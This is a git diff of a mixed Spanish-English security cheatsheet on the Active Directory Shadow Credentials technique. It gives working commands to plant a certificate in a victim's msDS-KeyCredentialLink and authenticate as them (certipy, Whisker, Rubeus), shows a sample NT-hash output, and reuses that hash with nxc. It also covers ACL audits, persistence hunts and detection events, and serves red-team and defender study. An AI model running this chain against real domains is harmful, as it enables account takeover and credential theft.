@@ -7,7 +7,7 @@ aliases:
 tags:
   - type/cheatsheet
   - vuln/ad-enumeration
-  - technique/discovery
+  - technique/credential-access
   - asset/active-directory
 primary categories: null
 secondary categories: null
@@ -15,7 +15,6 @@ tertiary categories: null
 type: CheatSheet
 linked:
   - "[[AD - Delegation Enumeration]]"
-  - "[[Shadow Credentials]]"
 ---
 # AD - Delegation Enumeration - Shadow Credentials
 
@@ -23,372 +22,142 @@ linked:
 
 ## Concept Overview
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Aspecto** | **Detalle** | **Importancia** |
 |:---:|:---:|:---:|
-| Shadow Credentials = NgC abuse | Modern technique | Standard. |
-| `msDS-KeyCredentialLink` attribute | NgC public key entries | LDAP. |
-| Atacante adds own cert to victim → auth as victim | Standard chain | Critical. |
-| Modern Windows 10/11 + Server 2016+ required | NgC support | Standard. |
-| Stealthier than ForceChangePassword | No password reset | OPSEC. |
-| Per-user multiple keys | Multi-cert support | Edge. |
-| ACL needed: GenericAll, GenericWrite, or WriteProperty msDS-KeyCredentialLink | Standard | Standard. |
-| Tool: certipy shadow | Standard | Standard. |
-| Tool: Whisker | Standard | Standard. |
-| Tool: ntlmrelayx --shadow-credentials | Adjacent | Adjacent. |
-| Detection: msDS-KeyCredentialLink modify | Defender | Adjacent. |
-| BloodHound `AddKeyCredentialLink` edge | Modern | Tool. |
-| Adjacent: Shadow Credentials hub | Cross-ref | Adjacent. |
-| Modern: extreme alerting | Defender | Standard. |
-| Cleanup: remove cert from KeyCredentialLink | Standard | OPSEC. |
-| Audit log retention | Standard | Adjacent. |
+| Atributo | `msDS-KeyCredentialLink` (multi-value, public key entries) | Modern auth (NgC). |
+| Mecanismo | Atacante añade su propio cert al victim → auth as victim via PKINIT | Standard abuse. |
+| Required ACL | `WriteProperty msDS-KeyCredentialLink` (GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063`) o GenericAll/GenericWrite | Privesc requirement. |
+| Stealthier que ForceChangePassword | No reset victim pwd | OPSEC. |
+| Min OS | Server 2016+ schema (NgC support) | Compatibility. |
 ^ad-shadowcred-concept
-
-### Shadow Credentials discovery
-
-```bash
-# Users with msDS-KeyCredentialLink set
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=user)(msDS-KeyCredentialLink=*))" \
-  samAccountName
-
-# Computers with msDS-KeyCredentialLink (rare)
-ldapsearch -h DC -D 'dom\u' -w pass -b "DC=dom,DC=local" \
-  "(&(objectCategory=computer)(msDS-KeyCredentialLink=*))" \
-  cn dNSHostName
-```
-
-```powershell
-# RSAT
-Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
-  Where {$_.'msDS-KeyCredentialLink'} |
-  Select Name,SamAccountName
-
-Get-ADComputer -Filter * -Properties msDS-KeyCredentialLink |
-  Where {$_.'msDS-KeyCredentialLink'} |
-  Select Name
-```
 
 ___
 
 ## msDS-KeyCredentialLink Attribute
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Multi-valued binary attribute | LDAP | Standard. |
-| Each entry: cert + metadata | Binary blob | Standard. |
-| KeyCredential blob structure | Microsoft format | Standard. |
-| Supports multiple entries per user | Edge | Edge. |
-| Standard NgC = Windows Hello / FIDO2 | Modern auth | Standard. |
-| Atacante adds custom cert | Same attribute | Critical. |
-| `Owner Self` extended right by default | Self-modify | Standard. |
-| Default: user/computer modifies own | Standard | Standard. |
-| ACL allows others to write = vuln | ACL combo | Critical. |
-| Cross-correlate with priv | Standard | Audit. |
-| BloodHound `AddKeyCredentialLink` edge | Modern | Tool. |
-| Detection: msDS-KeyCredentialLink change events | Defender | Adjacent. |
-| Modern: monitor closely | Best practice | Standard. |
-| Audit: per-quarter review | Standard | Compliance. |
-| Cleanup: remove unauthorized entries | Standard | OPSEC. |
-| Authenticated read | Default permissive | Standard. |
+| `Get-ADUser <victim> -Properties msDS-KeyCredentialLink` | Read attr (entries existentes) | Pre-modify. |
+| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Users con KeyCred set | Audit anomaly. |
+| `Get-ADComputer -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Computers con KeyCred (rare en non-AAD-joined) | Audit. |
+| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(msDS-KeyCredentialLink=*)" samAccountName` | LDAP raw | Linux. |
+| `nxc ldap <DC> -u u -p p --query "(msDS-KeyCredentialLink=*)" "samAccountName,msDS-KeyCredentialLink"` | netexec | Quick. |
 ^ad-shadowcred-attr
-
-### Attribute inspection
-
-```powershell
-# Decode KeyCredentialLink (DSInternals)
-Install-Module DSInternals
-Import-Module DSInternals
-
-$user = Get-ADUser victim -Properties msDS-KeyCredentialLink
-foreach ($kc in $user.'msDS-KeyCredentialLink') {
-  $decoded = ConvertFrom-ADKeyCredential $kc
-  $decoded | Format-List
-}
-
-# Output: Owner, CreationTime, KeyId, KeyMaterial, Usage, Source
-```
 
 ___
 
 ## Shadow Credentials Attack Chain
 
-| **Step** | **Comando** | **Notas** |
+| **Step** | **Comando** | **Detalle** |
 |:---:|:---:|:---:|
-| 1. Identify target with WriteProperty msDS-KeyCredentialLink ACL | ACL audit | Standard. |
-| 2. Generate cert | Tool generates auto | Standard. |
-| 3. Add cert to victim's msDS-KeyCredentialLink | LDAP write | Critical. |
-| 4. Request TGT using cert (PKINIT) | Standard | Standard. |
-| 5. Use TGT to access resources as victim | Pass-the-Ticket | Standard. |
-| `certipy shadow auto` | Standard tool | Standard. |
-| `certipy shadow add` | Manual mode | Standard. |
-| `certipy shadow list` | Enum existing | Standard. |
-| `certipy shadow remove` | Cleanup | Standard. |
-| Whisker (Windows) | Adjacent | Standard. |
-| `ntlmrelayx --shadow-credentials` | Combo with relay | Adjacent. |
-| Cross-correlate target priv | Standard | Audit. |
-| Detection: PKINIT events | Defender | Adjacent. |
-| Adjacent: Shadow Credentials hub | Cross-ref | Adjacent. |
-| Modern Defender for Identity NgC alerts | Modern | Defender. |
-| Cleanup: certipy shadow remove | Standard | OPSEC. |
+| 1. Identificar ACL `WriteProperty msDS-KeyCredentialLink` sobre victim | `Get-Acl "AD:<victim-DN>"` filter | Pre-attack. |
+| 2. Add cert al victim's KeyCredentialLink | `certipy shadow auto -u u -p pass -account victim -dc-ip <DC>` | Linux auto. |
+| 3. Auth via PKINIT con cert → recibís TGT del victim | `certipy auth -pfx victim.pfx -dc-ip <DC>` | Standard. |
+| 4. Output TGT + NT hash del victim | Direct use | Lateral. |
+| 5. Cleanup: clear KeyCred entry | `certipy shadow clear -u u -p pass -account victim -dc-ip <DC>` | Hygiene. |
 ^ad-shadowcred-chain
 
-### Shadow Credentials chain
-
 ```bash
-# Linux certipy (recommended)
-certipy shadow auto -u user@dom.local -p pass -account victim
+# Pipeline completo Linux con certipy
+certipy shadow auto -u atacante@corp.local -p 'pass' -account victim -dc-ip <DC>
 
-# Output: TGT for victim
-# Cleanup happens automatically with 'auto' mode
+# Output:
+# [*] Generating certificate
+# [*] Adding Key Credential
+# [*] Authenticating as victim with certificate
+# [*] Got NT hash for victim:
+#     aabbccdd11223344...
+# [*] Removing Key Credential
 
-# Manual mode
-certipy shadow add -u user@dom.local -p pass -account victim
-# Now have cert + ability to PKINIT as victim
-
-# Use cert for auth
-certipy auth -pfx victim.pfx -username victim
-# Output: TGT + NT hash
-
-# Cleanup
-certipy shadow remove -u user@dom.local -p pass -account victim -device-id <id>
+# Use NT hash
+nxc smb <target> -u victim -H aabbccdd11223344...
 ```
 
 ```cmd
-:: Windows Whisker
-Whisker.exe add /target:victim
-:: Use cert for PKINIT
-Rubeus.exe asktgt /user:victim /certificate:base64cert /password:CertPass /ptt
+:: Windows con Whisker
+Whisker.exe add /target:victim /domain:corp.local /dc:dc01.corp.local
+
+:: Use cert (Rubeus PKINIT)
+Rubeus.exe asktgt /user:victim /certificate:<base64-PFX> /password:<pwd> /domain:corp.local /dc:dc01 /ptt
 ```
 
 ___
 
-## ACL Required for Shadow Credentials
+## ACL Required
 
-| **ACE** | **Effect** | **Notas** |
+| **Comando** | **Qué detecta** | **Cuándo** |
 |:---:|:---:|:---:|
-| GenericAll on target | Includes WriteProperty msDS-KeyCredentialLink | Standard. |
-| GenericWrite on target | Same | Standard. |
-| WriteProperty msDS-KeyCredentialLink | Granular | Specific. |
-| WriteDACL on target | 2-step | Adjacent. |
-| WriteOwner on target | 3-step | Adjacent. |
-| AllExtendedRights on target | Includes | Standard. |
-| Self extended right | Computer/User self-modify | Standard. |
-| Default: target modifies own | Standard | Standard. |
-| ACL via group membership | Indirect | Standard. |
-| BloodHound `AddKeyCredentialLink` edge | Modern | Tool. |
-| Cross-correlate with priv | Standard | Audit. |
-| Detection: ACL modify on KeyCredentialLink | Defender | Adjacent. |
-| Per-quarter ACL audit | Standard | Compliance. |
-| Modern: minimal modify rights | Hardening | Standard. |
-| Cleanup: revert ACL changes | Standard | OPSEC. |
-| Compliance: documented baseline | Standard | Adjacent. |
+| `Get-Acl "AD:<victim-DN>" \| ? Access -match "WriteProperty"` filter por GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063` | Specific WriteProperty msDS-KeyCredentialLink | Per-victim audit. |
+| `Find-InterestingDomainAcl -ResolveGUIDs \| ? ObjectAceType -match "ms-DS-Key-Credential-Link"` | Bulk hunt forest-wide | Audit. |
+| GenericAll / GenericWrite / WriteDacl en victim | Implícito = puede modify KeyCred | Indirect path. |
 ^ad-shadowcred-acl
 
-### Required ACL audit
-
 ```powershell
-# Find principals with WriteProperty msDS-KeyCredentialLink on target
-$target = "CN=victim,CN=Users,DC=dom,DC=local"
-$keyCredGUID = "5b47d60f-6090-40b2-9f37-2a4de88f3063"  # msDS-KeyCredentialLink
-
-Get-Acl "AD:$target" | Select -ExpandProperty Access |
+# Hunt principals con WriteProperty sobre KeyCred attr
+Find-InterestingDomainAcl -ResolveGUIDs |
   Where {
-    $_.AccessControlType -eq "Allow" -and
-    (
-      $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|AllExtendedRights" -or
-      ($_.ActiveDirectoryRights -match "WriteProperty" -and $_.ObjectType -eq $keyCredGUID)
-    ) -and
-    $_.IdentityReference.Value -notmatch "Domain Admins|Enterprise Admins|Administrators|SYSTEM|BUILTIN|Self"
+    $_.ObjectAceType -eq "ms-DS-Key-Credential-Link" -or
+    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl" -and
+     $_.IdentityReferenceClass -eq "user")
   } |
-  Select IdentityReference,ActiveDirectoryRights
+  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
 ```
 
 ___
 
 ## BloodHound AddKeyCredentialLink Edge
 
-| **Edge** | **Significado** | **Notas** |
+| **Cypher** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `AddKeyCredentialLink` | Direct write permission | Modern edge. |
-| `MemberOf` chain | Indirect via group | Standard. |
-| `GenericAll` on target | Includes | Adjacent. |
-| `GenericWrite` on target | Same | Adjacent. |
-| BloodHound CE 5.x+ Shadow Cred support | Modern | Tool. |
-| Cypher: find Shadow Cred paths | Standard | Tool. |
-| Visual graph | Per-edge | Tool. |
-| Per-domain ingest | Multi-domain | Adjacent. |
-| BHCE 6.x improved | Modern | Tool. |
-| Custom analytics | Cypher | Tool. |
-| Pre-built Shadow Cred queries | Standard | Tool. |
-| Cross-correlate priv | Standard | Tool. |
-| Detection: BloodHound collection events | Defender | Adjacent. |
-| Modern: continuous BHCE | Defender | Standard. |
-| Compliance: Shadow Cred baseline | Standard | Adjacent. |
-| Adjacent: BloodHound hub | Cross-ref | Adjacent. |
+| `MATCH (u)-[:AddKeyCredentialLink]->(t) RETURN u.name,t.name` | All Shadow Cred edges | Inventory. |
+| `MATCH (u {owned:true})-[:AddKeyCredentialLink*1..]->(t {highvalue:true}) RETURN u,t` | Path owned → high-value via Shadow Cred | Privesc. |
+| `MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) WHERE any(r IN relationships(p) WHERE type(r) = "AddKeyCredentialLink") RETURN p` | Mixed paths con Shadow Cred edge | Standard. |
 ^ad-shadowcred-bh
-
-### BloodHound Shadow Credentials queries
-
-```cypher
-// All AddKeyCredentialLink relationships
-MATCH (src)-[:AddKeyCredentialLink|MemberOf*1..]->(target:User)
-RETURN src.name, target.name
-
-// Atacante can Shadow Cred high-value
-MATCH (u {owned: true})-[:AddKeyCredentialLink|MemberOf|GenericAll|GenericWrite*1..]->(target)
-WHERE target.adminCount = true
-RETURN u.name, target.name
-
-// Path: owned → Shadow Cred → DA
-MATCH (u {owned: true}), (target:User)
-WHERE target.adminCount = true
-MATCH p=shortestPath((u)-[:AddKeyCredentialLink|MemberOf|GenericAll|GenericWrite*1..]->(target))
-RETURN p
-```
 
 ___
 
 ## Existing Shadow Credentials Audit
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué detecta** | **Cuándo** |
 |:---:|:---:|:---:|
-| Users with msDS-KeyCredentialLink populated | Standard or attack? | Audit. |
-| Computers with msDS-KeyCredentialLink | Edge | Audit. |
-| Multiple key entries per user | Edge | Audit. |
-| Recent additions | Atacante plant or legit | Defender. |
-| Standard NgC: Windows Hello, FIDO2 | Legit | Standard. |
-| Atacante cert: not from legit source | Attack | Audit. |
-| `Source` field in decoded KC | Indicates origin | Standard. |
-| Cross-correlate with auth events | Standard | Defender. |
-| Detection: PKINIT auth events | Defender | Adjacent. |
-| Audit: per-user KC review | Standard | Compliance. |
-| Cleanup: remove unauthorized | Standard | OPSEC. |
-| Modern Defender for Identity Shadow Cred alerts | Modern | Defender. |
-| BloodHound continuous | Modern | Tool. |
-| Compliance: documented baseline | Standard | Adjacent. |
-| Cross-correlate priv | Standard | Audit. |
-| Modern: extreme alerting | Best practice | Standard. |
+| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink,whenChanged \| ? msDS-KeyCredentialLink` | Users con KeyCred (AAD-joined o atacante plant) | Audit. |
+| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink,whenChanged \| ? {$_.'msDS-KeyCredentialLink' -and $_.whenChanged -gt (Get-Date).AddDays(-7)}` | KeyCred añadidos última semana | Persistence hunt. |
+| `certipy shadow list -u atacante -p pass -account <victim> -dc-ip <DC>` | List KeyCred entries del victim | Pre-modify check. |
 ^ad-shadowcred-audit
 
-### KC audit script
-
 ```powershell
-# All users + computers with KC populated
-$report = @()
-
-Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
-  Where {$_.'msDS-KeyCredentialLink'} |
-  ForEach-Object {
-    $user = $_
-    $kcCount = $user.'msDS-KeyCredentialLink'.Count
-    $report += [PSCustomObject]@{
-      Type = "User"
-      Name = $user.Name
-      SamAccountName = $user.SamAccountName
-      KCEntries = $kcCount
-      AdminCount = $user.AdminCount
-    }
-  }
-
-Get-ADComputer -Filter * -Properties msDS-KeyCredentialLink |
-  Where {$_.'msDS-KeyCredentialLink'} |
-  ForEach-Object {
-    $comp = $_
-    $kcCount = $comp.'msDS-KeyCredentialLink'.Count
-    $report += [PSCustomObject]@{
-      Type = "Computer"
-      Name = $comp.Name
-      SamAccountName = $comp.SamAccountName
-      KCEntries = $kcCount
-      AdminCount = $null
-    }
-  }
-
-$report | Format-Table -AutoSize
-$report | Where {$_.AdminCount -eq 1} | Format-Table -AutoSize  # Privileged
+# Hunt persistencia reciente
+$Recent = (Get-Date).AddDays(-7)
+Get-ADUser -Filter * -Properties msDS-KeyCredentialLink,whenChanged |
+  Where { $_.'msDS-KeyCredentialLink' -and $_.whenChanged -gt $Recent } |
+  Select Name,SamAccountName,whenChanged
 ```
 
 ___
 
 ## Detection & Mitigations
 
-| **Detection** | **Detail** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| Event ID 4742 (computer change) | Adjacent | Defender. |
-| Event ID 4738 (user change) | Adjacent | Defender. |
-| Event ID 4768 (TGT request via PKINIT) | Direct | Defender. |
-| Microsoft Defender for Identity Shadow Cred alert | Modern | Defender. |
-| BloodHound continuous monitoring | Modern | Tool. |
-| Per-quarter KC audit | Standard | Compliance. |
-| Modern: extreme alerting on PKINIT | Defender | Standard. |
-| Cross-correlate auth events | Standard | Defender. |
-| Audit: minimize Shadow Cred capability | Best practice | Standard. |
-| Modern: documented per-user NgC | Standard | Adjacent. |
-| Compliance: NgC baseline | Standard | Adjacent. |
-| Cleanup: stale KC entries | Hygiene | Standard. |
-| Detection: ADCS NgC + cert template | Adjacent | Defender. |
-| Modern: 24x7 monitoring | Defender | Standard. |
-| Honeypot accounts: alert on KC modify | Defender plant | Detection. |
-| Cross-trust Shadow Cred | Cross-forest | Critical. |
+| Audit Subcategory `Directory Service Changes` | Event 5136 con `msDS-KeyCredentialLink` modify | Defender side. |
+| MDI alerta `Suspicious modification of a sensitive attribute` | Modern detection | Real-time. |
+| Restrict `WriteProperty msDS-KeyCredentialLink` ACEs | Granular hardening | Audit. |
+| `Add-ADGroupMember "Protected Users" -Members <victim>` | PKINIT delegation restrictions | Tier 0. |
+| Audit cert authority logs (issued certs) | Cross-correlate suspicious enrollments | SIEM. |
 ^ad-shadowcred-detection
-
-### Hardening + detection
-
-```powershell
-# Audit + remove stale KC entries
-Get-ADUser -Filter * -Properties msDS-KeyCredentialLink |
-  Where {$_.'msDS-KeyCredentialLink'} |
-  ForEach-Object {
-    $user = $_.SamAccountName
-    Write-Host "User $user has $($_.'msDS-KeyCredentialLink'.Count) KC entries"
-    # Manual review: legit Windows Hello vs attacker plant
-  }
-
-# Detection: alert on msDS-KeyCredentialLink modify (Event 5136)
-# Microsoft Defender for Identity:
-# Alert: "Suspicious Kerberos certificate (NgC) authentication"
-```
 
 ___
 
 ## Modern: NgC = Windows Hello
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Concept** | **Detalle** | **Cuándo importa** |
 |:---:|:---:|:---:|
-| NgC = Next-Generation Credentials | Modern AD auth | Standard. |
-| Backed by TPM key | Hardware-bound | Standard. |
-| Windows Hello for Business | Modern auth | Standard. |
-| FIDO2 / WebAuthn integration | Modern | Standard. |
-| msDS-KeyCredentialLink for storage | LDAP | Standard. |
-| Multiple devices per user | Phone, laptop, etc. | Standard. |
-| Server 2016+ schema requirement | Required | Standard. |
-| Modern hardening: prefer NgC over passwords | Best practice | Standard. |
-| Atacante abuse: same attribute | Cert add | Standard. |
-| Distinguishing legit vs attacker entries | Source field | Audit. |
-| Defender: PKINIT events monitoring | Standard | Defender. |
-| Compliance: NgC adoption baseline | Standard | Adjacent. |
-| Adjacent: Windows Hello docs | Microsoft | Reference. |
-| Per-user multiple devices | Standard | Standard. |
-| Stale device cleanup | Hygiene | Standard. |
-| Cross-correlate device join events | Standard | Defender. |
+| Next-Generation Credentials (NgC) | PKI-based AD auth (PKINIT con device cert) | Modern auth. |
+| Windows Hello for Business | Usa NgC para passwordless | Hybrid environments. |
+| TPM-backed keys | Cert key reside en TPM (no exfiltrable) | Hardware protection. |
+| Atacante en NgC environment | KeyCred entries legítimas masivas | Audit harder. |
 ^ad-shadowcred-ngc
 
-### NgC vs Shadow Cred attack
-
-```
-Legitimate NgC (Windows Hello):
-- User registers device (laptop/phone)
-- Device's TPM key stored in msDS-KeyCredentialLink
-- User can PKINIT auth from registered device
-
-Atacante abuse (Shadow Cred):
-- Atacante generates cert (no TPM)
-- Adds cert to victim's msDS-KeyCredentialLink (via ACL)
-- Atacante PKINIT auths as victim
-- Difference: Source field doesn't match registered device
-
-Detection: PKINIT auth from non-typical source/time/location
-Microsoft Defender for Identity: ML-based anomaly detection
-```
+**Audit caveat:** entornos con WHfB tienen KeyCred entries en **muchos users legítimos**. Hunt = filter por `whenChanged` reciente + cross-ref con creator (Event 5136).
 
 ***
